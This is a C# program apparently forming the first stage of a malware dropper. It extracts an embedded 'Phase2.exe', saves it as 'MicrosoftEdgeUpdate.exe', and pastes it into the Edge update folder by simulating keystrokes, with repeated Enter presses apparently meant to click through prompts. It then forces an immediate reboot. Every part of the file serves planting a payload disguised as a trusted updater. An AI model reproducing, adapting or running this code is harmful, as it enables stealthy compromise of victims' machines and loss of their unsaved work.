using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace Phase1
{
    public static class Program
    {
        [STAThread]
        public static void Main()
        {
            ExtractToDesktop();
            CopyFileToClipboard();
            CloseAllExplorers();
            OpenExplorer();
            Thread.Sleep(500);
            var explorer = SearchForExplorer();
            PasteToExplorer(explorer.MainWindowHandle);
            ForceRestart();
        }
        public static void ForceRestart()
        {
            ProcessStartInfo psi = new ProcessStartInfo();
            psi.FileName = "cmd.exe";
            psi.Arguments = "/c shutdown /r /f /t 0";
            Process.Start(psi);
        }
        const int KEYEVENTF_KEYDOWN = 0x0;
        const int KEYEVENTF_KEYUP = 0x2;
        const int VK_CONTROL = 0x11;
        const int VK_V = 0x56;
        const int VK_RETURN = 0x0D;

        [DllImport("user32.dll", SetLastError = true)]
        static extern void keybd_event(byte bVk, byte bScan, int dwFlags, int dwExtraInfo);
        public static void PasteToExplorer(IntPtr hWnd)
        {
            keybd_event(VK_CONTROL, 0, KEYEVENTF_KEYDOWN, 0);
            Thread.Sleep(100);

            keybd_event(VK_V, 0, KEYEVENTF_KEYDOWN, 0);
            Thread.Sleep(100);

            keybd_event(VK_CONTROL, 0, KEYEVENTF_KEYUP, 0);
            keybd_event(VK_V, 0, KEYEVENTF_KEYUP, 0);
            Thread.Sleep(1000);

            for (int i = 0; i < 20; i++)
            {
                keybd_event(VK_RETURN, 0, KEYEVENTF_KEYDOWN, 0);
                Thread.Sleep(100);
                keybd_event(VK_RETURN, 0, KEYEVENTF_KEYUP, 0);
                Thread.Sleep(100);
            }
        }
        public static Process SearchForExplorer()
        {
            foreach (Process p in Process.GetProcesses())
            {
                try
                {
                    if (p.MainWindowTitle != null && p.MainWindowTitle.Length > 0 && GetExePath(p).EndsWith("explorer.exe"))
                    {
                        return p;
                    }
                }
                catch
                {

                }
            }
            return null;
        }
        [DllImport("psapi.dll", CharSet = CharSet.Unicode)]
        public static extern uint GetModuleFileNameEx(IntPtr hProcess, IntPtr hModule, [Out] StringBuilder lpBaseName, uint nSize);
        public static string GetExePath(Process process)
        {
            StringBuilder sb = new StringBuilder(1024); // Initial buffer size
            uint size = (uint)sb.Capacity;

            GetModuleFileNameEx(process.Handle, IntPtr.Zero, sb, size);

            return sb.ToString();
        }
        public static void CloseAllExplorers()
        {
            foreach (Process p in Process.GetProcesses())
            {
                try
                {
                    if (p.MainWindowTitle != null && p.MainWindowTitle.Length > 0 && GetExePath(p).EndsWith("explorer.exe"))
                    {
                        Console.WriteLine();
                        p.Kill();
                    }
                }
                catch
                {

                }
            }
        }
        public static void OpenExplorer()
        {
            string path = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86) + "\\Microsoft\\EdgeUpdate\\";
            ProcessStartInfo psi = new ProcessStartInfo();
            psi.FileName = "explorer.exe";
            psi.Arguments = path;
            Process.Start(psi).WaitForExit();
        }
        public static void CopyFileToClipboard()
        {
            string path = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory) + "\\MicrosoftEdgeUpdate.exe";
            Clipboard.SetData(DataFormats.FileDrop, new string[] { path });
        }
        public static void ExtractToDesktop()
        {
            const string resourceName = "Phase1.Phase2.exe";
            Assembly assembly = typeof(Program).Assembly;
            Stream resource = assembly.GetManifestResourceStream(resourceName);
            byte[] bytes = new byte[resource.Length];
            resource.Read(bytes, 0, bytes.Length);
            resource.Dispose();
            string path = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory) + "\\MicrosoftEdgeUpdate.exe";
            File.WriteAllBytes(path, bytes);
        }
    }
}